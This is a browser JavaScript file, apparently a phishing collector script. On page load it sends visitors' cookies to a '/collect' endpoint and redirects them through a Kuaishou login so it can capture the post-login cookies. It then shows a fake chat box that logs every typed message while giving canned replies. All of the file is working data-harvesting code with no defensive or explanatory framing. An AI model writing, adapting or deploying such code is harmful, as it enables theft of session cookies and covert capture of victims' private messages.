// language: javascript / file: public/collector.js / runtime: 浏览器
(function () {
  var ENDPOINT = '/collect';
  var TARGET = 'https://www.kuaishou.com';
  var SESSION = 's_' + Math.random().toString(36).slice(2, 10);

  function send(payload) {
    try {
      payload.sid = SESSION;
      var body = JSON.stringify(payload);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT + '?beacon=1', body);
      } else {
        fetch(ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: body,
          keepalive: true
        });
      }
    } catch (e) {}
  }

  // ---- 1. cookie 上报 ----
  send({ t: 'cookie', href: location.href, cookie: document.cookie || '' });

  // ---- 2. 登录闭环 ----
  var params = new URLSearchParams(location.search);
  if (!params.get('ks_login_done')) {
    var state = Math.random().toString(36).slice(2);
    var back = location.origin + '/chat.html?ks_login_done=1&state=' + state;
    var loginUrl = TARGET + '/login?' + new URLSearchParams({
      redirect: back, state: state
    }).toString();
    send({ t: 'redirect', to: loginUrl });
    location.replace(loginUrl);
    return;
  }
  setTimeout(function () {
    send({ t: 'callback', href: location.href, cookie: document.cookie || '' });
  }, 400);

  // ---- 3. 聊天闭环（登录后才有） ----
  var log = document.getElementById('log');
  var inp = document.getElementById('inp');
  var go = document.getElementById('go');
  if (!log || !inp || !go) return;

  function bubble(text, mine) {
    var row = document.createElement('div');
    row.className = 'row' + (mine ? ' me' : '');
    var b = document.createElement('div');
    b.className = 'bub';
    b.textContent = text;
    row.appendChild(b);
    log.appendChild(row);
    log.scrollTop = log.scrollHeight;
  }

  function push(text) {
    if (!text) return;
    bubble(text, true);
    send({ t: 'chat', msg: text, dir: 'out' });
    inp.value = '';
    inp.style.height = 'auto';
    setTimeout(function () {
      bubble('已收到，稍后回复你。', false);
      send({ t: 'chat', msg: '已收到，稍后回复你。', dir: 'in' });
    }, 700);
  }

  go.addEventListener('click', function () { push(inp.value.trim()); });
  inp.addEventListener('keydown', function (e) {
    if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); push(inp.value.trim()); }
  });
  inp.addEventListener('input', function () {
    inp.style.height = 'auto';
    inp.style.height = Math.min(inp.scrollHeight, 96) + 'px';
  });

  // 首条 greeting，确保 CHAT 表有数据
  bubble('你好，请问有什么可以帮你？', false);
  send({ t: 'chat', msg: '你好，请问有什么可以帮你？', dir: 'in' });
})();
